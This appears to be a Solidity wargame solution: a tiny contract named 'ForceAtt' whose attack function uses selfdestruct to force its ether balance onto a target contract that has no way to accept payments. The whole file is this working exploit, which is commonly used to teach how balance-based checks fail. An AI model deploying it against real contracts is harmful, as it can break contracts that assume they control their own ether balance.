// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAtt {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }

    receive() external payable {}
}
